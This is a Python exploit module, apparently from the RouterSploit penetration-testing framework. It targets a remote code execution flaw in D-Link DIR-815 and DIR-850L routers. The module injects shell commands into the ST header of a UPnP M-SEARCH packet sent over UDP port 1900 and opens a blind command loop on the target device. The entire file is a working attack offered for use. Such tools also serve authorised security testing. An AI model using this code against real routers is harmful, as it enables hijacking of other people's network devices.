from routersploit.core.exploit import *
from routersploit.core.udp.udp_client import UDPClient


class Exploit(UDPClient):
    __info__ = {
        "name": "D-Link DIR-815 & DIR-850L RCE",
        "description": "Module exploits D-Link DIR-815 and DIR-850L Remote Code Execution vulnerability "
                       "which allows executing command on the device.",
        "authors": (
            "Samuel Huntley",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/38715/",
        ),
        "devices": (
            "D-Link DIR-815",
            "D-Link DIR-850L",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(1900, "Target UPNP port")

    def run(self):
        print_status("It's not possible to check if the target is vulnerable. Try to use following command loop.")
        print_status("Invoking command loop...")
        print_status("It is blind command injection, response is not available")
        shell(self, architecture="mipsle")

    def execute(self, cmd):
        request = (
            "M-SEARCH * HTTP/1.1\r\n" +
            "HOST:{}:{}\r\n".format(self.target, self.port) +
            "ST:urn:schemas-upnp-org:service:WANIPConnection:1;{};ls\r\n".format(cmd) +
            "MX:2\r\n" +
            "MAN:\"ssdp:discover\"\r\n\r\n"
        )

        request = bytes(request, "utf-8")

        udp_client = self.udp_create()
        udp_client.send(request)
        udp_client.close()

        return ""

    @mute
    def check(self):
        return None  # it is not possible to check if target is vulnerable without exploiting it
